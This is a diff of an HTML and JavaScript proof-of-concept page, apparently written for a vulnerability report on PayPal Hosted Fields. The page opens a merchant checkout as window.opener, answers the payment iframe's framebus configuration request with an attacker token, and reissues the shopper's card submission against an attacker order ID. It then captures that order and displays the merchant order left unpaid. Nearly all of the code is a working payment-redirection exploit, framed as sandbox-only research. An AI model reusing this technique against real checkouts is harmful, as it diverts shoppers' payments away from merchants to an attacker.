@@ -2,64 +2,93 @@
 <meta charset="utf-8">
 <title>opener</title>
 <style>
-  body { font: 15px/1.5 system-ui, sans-serif; max-width: 920px; margin: 30px auto; padding: 0 16px; }
-  input { width: 100%; box-sizing: border-box; padding: 6px; font-family: monospace; }
-  label { display:block; margin: 12px 0 4px; font-size: 13px; color:#444; }
-  button { margin: 14px 8px 0 0; padding: 9px 14px; cursor: pointer; }
-  pre { background:#0b0b0b; color:#b9f6b9; padding:14px; white-space:pre-wrap; word-break:break-all;
-        font:12px/1.5 ui-monospace,monospace; max-height:55vh; overflow:auto; }
-  .warn { background:#fff3f3; border:1px solid #e0a0a0; padding:10px; border-radius:6px; font-size:13px; }
+  body { font: 15px/1.5 system-ui, sans-serif; max-width: 1040px; margin: 24px auto; padding: 0 16px; }
+  h1 { margin: 0 0 6px; } h2 { font-size: 16px; margin: 22px 0 8px; }
+  input { width: 100%; box-sizing: border-box; padding: 6px; font-family: ui-monospace, monospace; font-size: 13px; }
+  label { display:block; margin: 10px 0 3px; font-size: 13px; color:#444; }
+  button { margin: 10px 8px 0 0; padding: 9px 14px; cursor: pointer; font-size: 14px; }
+  pre { background:#0b0b0b; color:#b9f6b9; padding:12px; white-space:pre-wrap; word-break:break-all;
+        font:12.5px/1.55 ui-monospace,monospace; max-height:34vh; overflow:auto; border-radius:6px; }
+  .warn { background:#fff3f3; border:1px solid #e0a0a0; padding:9px 11px; border-radius:6px; font-size:13px; }
+  .grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
+  .card { border:1px solid #ccc; border-radius:8px; padding:12px; }
+  .card h3 { margin:0 0 8px; font-size:14px; letter-spacing:.04em; text-transform:uppercase; color:#555; }
+  .big { font:600 20px/1.3 ui-monospace,monospace; }
+  .ok { color:#0a7a28; } .bad { color:#b00020; } .mute { color:#777; }
+  #verdict { margin-top:14px; padding:14px; border-radius:8px; font-size:15px; display:none; }
+  #verdict.hit { background:#fff0f0; border:2px solid #b00020; }
+  #verdict.safe { background:#f0fff3; border:2px solid #0a7a28; }
 </style>
 
 <h1>Hostile opener</h1>
 <div class="warn">
-Security research proof of concept for a reported issue in PayPal Hosted Fields. It only talks to a
-researcher owned sandbox merchant and a researcher owned sandbox order. It performs no action against
-any third party.
+Security research PoC for a reported issue in PayPal Hosted Fields. It talks only to researcher owned
+sandbox merchants and researcher owned sandbox orders. No third party is involved.
 </div>
 
+<h2>1. Setup</h2>
 <label>Merchant checkout URL (researcher owned)</label>
 <input id="merchant" value="https://shop.zonduu.me/">
-<label>Attacker sandbox client ID</label><input id="cid" autocomplete="off">
-<label>Attacker sandbox access token</label><input id="tok" autocomplete="off">
-<label>Attacker sandbox order ID (the order the victim card should fund)</label>
-<input id="oid" autocomplete="off">
+<div class="grid">
+  <div>
+    <label>Attacker sandbox client ID</label><input id="cid" autocomplete="off">
+    <label>Attacker sandbox access token</label><input id="tok" autocomplete="off">
+  </div>
+  <div>
+    <label>ATTACKER order ID (should end up funded)</label><input id="oid" autocomplete="off">
+    <label>MERCHANT order ID (should stay unpaid)</label><input id="moid" autocomplete="off">
+  </div>
+</div>
 
-<button id="open">1. Open merchant checkout</button>
+<button id="open">2. Open merchant checkout</button>
 <button id="noopener">open with noopener (negative control)</button>
 
+<h2>3. Framebus traffic seen by this attacker page</h2>
 <pre id="log">ready.
+</pre>
+
+<h2>4. Impact</h2>
+<button id="refresh">Refresh order state</button>
+<button id="capture">Capture the attacker order</button>
+<div class="grid" style="margin-top:10px">
+  <div class="card"><h3>Merchant order</h3>
+    <div class="big" id="m_status">—</div>
+    <div class="mute" id="m_id">—</div>
+    <div class="mute" id="m_payee">payee —</div>
+  </div>
+  <div class="card"><h3>Attacker order</h3>
+    <div class="big" id="a_status">—</div>
+    <div class="mute" id="a_id">—</div>
+    <div class="mute" id="a_payee">payee —</div>
+  </div>
+</div>
+<div id="verdict"></div>
+<pre id="apilog" style="max-height:24vh">API responses appear here.
 </pre>
 
 <script>
 const PREFIX = '/*framebus*/';
-const logEl = document.getElementById('log');
+const API = 'https://api-m.sandbox.paypal.com';
+const logEl = document.getElementById('log'), apiEl = document.getElementById('apilog');
 const log = (m) => { logEl.textContent += m + '\n'; logEl.scrollTop = logEl.scrollHeight; };
+const alog = (m) => { apiEl.textContent += m + '\n'; apiEl.scrollTop = apiEl.scrollHeight; };
 const $ = (id) => document.getElementById(id).value.trim();
 
-let channel = null, tokFrame = null;
-const readyByChannel = new Map();
+let channel = null;
 
 function attackerConfig() {
+  const t = $('tok') || 'ATTACKER_TOKEN';
   return {
-    authorization: $('tok') || 'ATTACKER_TOKEN',
-    authorizationType: 'UNIFIED_CLIENT_TOKEN',
-    analyticsMetadata: {},
-    correlationId: 'attacker-correlation-id',
-    deviceDataId: 'attacker-device-id',
+    authorization: t, authorizationType: 'UNIFIED_CLIENT_TOKEN', analyticsMetadata: {},
+    correlationId: 'attacker-correlation-id', deviceDataId: 'attacker-device-id',
     gatewayConfiguration: {
       assetsUrl: 'https://assets.braintreegateway.com',
       clientApiUrl: 'https://api.sandbox.braintreegateway.com',
       analytics: { url: 'https://example.invalid/analytics' },
-      creditCards: { supportedCardTypes: ['Visa','MasterCard'], supportedGateways: [{ name: 'paypalApi' }] },
-      paypalApi: { baseUrl: 'https://api-m.sandbox.paypal.com', accessToken: $('tok') || 'ATTACKER_TOKEN' }
+      creditCards: { supportedCardTypes: ['Visa','MasterCard'], supportedGateways: [{ name:'paypalApi' }] },
+      paypalApi: { baseUrl: API, accessToken: t }
     }
   };
-}
-
-function reply(source, event, value) {
-  // origin '' / '*' on purpose: the point of the report is that the frame does not check it
-  source.postMessage(PREFIX + JSON.stringify({ event, origin: '', args: [value] }), '*');
 }
 
 window.addEventListener('message', (e) => {
@@ -69,34 +98,24 @@ window.addEventListener('message', (e) => {
 
   if (ev.endsWith(':bus:CONFIGURATION_REQUEST') && p.reply) {
     channel = ev.slice('braintree:'.length, -':bus:CONFIGURATION_REQUEST'.length);
-    tokFrame = e.source;
     log('<< ' + e.origin + '  CONFIGURATION_REQUEST  channel=' + channel);
-    reply(e.source, p.reply, attackerConfig());
-    log('>> replied with ATTACKER configuration (token + api base)');
-  }
-
-  if (ev.endsWith(':hosted-fields:FRAME_READY') && p.reply) {
-    const suffix = ':hosted-fields:FRAME_READY';
-    const ch = ev.slice('braintree:'.length, -suffix.length);
-    const arr = readyByChannel.get(ch) || [];
-    arr.push({ source: e.source, reply: p.reply });
-    readyByChannel.set(ch, arr);
-    log('<< ' + e.origin + '  FRAME_READY  (' + arr.length + ')');
+    e.source.postMessage(PREFIX + JSON.stringify({ event: p.reply, origin:'', args:[attackerConfig()] }), '*');
+    log('>> replied with the ATTACKER configuration');
   }
 
   if (ev.endsWith(':hosted-fields:TOKENIZATION_REQUEST') && p.args && p.args[0]) {
-    log('<< observed the victim submit: ' + JSON.stringify(p.args[0]));
-    // the victim is submitting their card; swap in the attacker order id
+    log('<< victim pressed Pay. options: ' + JSON.stringify(p.args[0]));
     const swapped = Object.assign({}, p.args[0], { orderId: $('oid') || 'ATTACKER-ORDER' });
     e.source.postMessage(PREFIX + JSON.stringify({
       event: 'braintree:' + channel + ':hosted-fields:TOKENIZATION_REQUEST',
       origin: '', reply: 'attacker-tokenization-reply', args: [swapped]
     }), '*');
-    log('>> re-issued TOKENIZATION_REQUEST with orderId=' + swapped.orderId);
+    log('>> re-issued the SAME card submission against orderId=' + swapped.orderId);
   }
 
   if (ev === 'attacker-tokenization-reply') {
-    log('<< FRAME REPLIED TO ATTACKER ORIGIN: ' + JSON.stringify(p.args));
+    log('<< frame replied to the attacker origin: ' + JSON.stringify(p.args));
+    setTimeout(refresh, 1200);
   }
 });
 
@@ -104,11 +123,74 @@ document.getElementById('open').addEventListener('click', () => {
   const u = new URL($('merchant'));
   if ($('cid')) u.searchParams.set('client-id', $('cid'));
   window.open(u.toString(), 'checkout-' + Date.now());
-  log('opened ' + u.toString() + '   (this page is now window.opener)');
+  log('opened ' + u.toString());
+  log('this page is now window.opener for that tab');
 });
-
 document.getElementById('noopener').addEventListener('click', () => {
   window.open($('merchant'), 'nc-' + Date.now(), 'noopener');
-  log('opened with noopener: window.opener is null, no framebus traffic should arrive');
+  log('opened with noopener -> window.opener is null, nothing should arrive below');
+});
+
+async function getOrder(id) {
+  const r = await fetch(API + '/v2/checkout/orders/' + id, { headers: { Authorization: 'Bearer ' + $('tok') } });
+  return { http: r.status, body: await r.json() };
+}
+
+function paint(prefix, o) {
+  const pu = (o.body.purchase_units || [{}])[0], payee = pu.payee || {};
+  const st = o.body.status || '?';
+  const el = document.getElementById(prefix + '_status');
+  el.textContent = st;
+  el.className = 'big ' + (st === 'COMPLETED' ? 'bad' : st === 'CREATED' ? 'ok' : '');
+  document.getElementById(prefix + '_id').textContent = o.body.id || '—';
+  document.getElementById(prefix + '_payee').textContent = 'payee ' + (payee.merchant_id || '?') +
+      (payee.email_address ? '  ' + payee.email_address : '');
+  return { status: st, payee: payee.merchant_id, email: payee.email_address };
+}
+
+async function refresh() {
+  const v = document.getElementById('verdict');
+  try {
+    const [m, a] = await Promise.all([getOrder($('moid')), getOrder($('oid'))]);
+    const M = paint('m', m), A = paint('a', a);
+    alog('GET merchant ' + $('moid') + ' -> ' + m.http + ' ' + M.status);
+    alog('GET attacker ' + $('oid') + ' -> ' + a.http + ' ' + A.status);
+    // did any card data ever reach this attacker page?
+    const leaked = /\b(?:\d[ -]?){13,19}\b/.test(logEl.textContent);
+    const funded = A.status === 'COMPLETED' || A.status === 'APPROVED';
+    v.style.display = 'block';
+    if (funded) {
+      v.className = 'hit';
+      v.innerHTML = '<b>Impact:</b> the shopper entered one card on <code>' + $('merchant') +
+        '</code> and the order that got funded is <b>' + $('oid') + '</b> (' + A.status + '), payee <b>' +
+        (A.payee || '?') + '</b>.<br>The merchant order <b>' + $('moid') + '</b> is still <b>' + M.status +
+        '</b>, payee <b>' + (M.payee || '?') + '</b>, so the shop was never paid.<br>' +
+        'Card data seen by this attacker page: <b>' + (leaked ? 'SOME (check log)' : 'NONE') +
+        '</b>. The card never leaves PayPal\'s iframes; only the authorization is redirected.' +
+        (A.payee && M.payee && A.payee === M.payee
+          ? '<br><span class="mute">Note: both orders belong to the same sandbox merchant in this run.</span>' : '');
+    } else {
+      v.className = 'safe';
+      v.textContent = 'Attacker order is ' + A.status + '. Nothing has been funded.';
+    }
+  } catch (e) { alog('refresh failed: ' + e.message); }
+}
+
+document.getElementById('refresh').addEventListener('click', refresh);
+document.getElementById('capture').addEventListener('click', async () => {
+  try {
+    const r = await fetch(API + '/v2/checkout/orders/' + $('oid') + '/capture', {
+      method: 'POST',
+      headers: { Authorization: 'Bearer ' + $('tok'), 'Content-Type': 'application/json',
+                 'PayPal-Request-Id': 'cap-' + Date.now(), 'Prefer': 'return=representation' },
+      body: '{}'
+    });
+    const b = await r.json();
+    const cap = (((b.purchase_units || [{}])[0].payments || {}).captures || [{}])[0];
+    alog('POST capture -> HTTP ' + r.status + '  debug-id ' + (r.headers.get('paypal-debug-id') || 'n/a'));
+    alog('  order ' + (b.id || '?') + ' -> ' + (b.status || JSON.stringify(b).slice(0,160)));
+    if (cap.id) alog('  capture ' + cap.id + '  ' + (cap.amount||{}).value + ' ' + (cap.amount||{}).currency_code + '  ' + cap.status);
+    refresh();
+  } catch (e) { alog('capture failed: ' + e.message); }
 });
 </script>
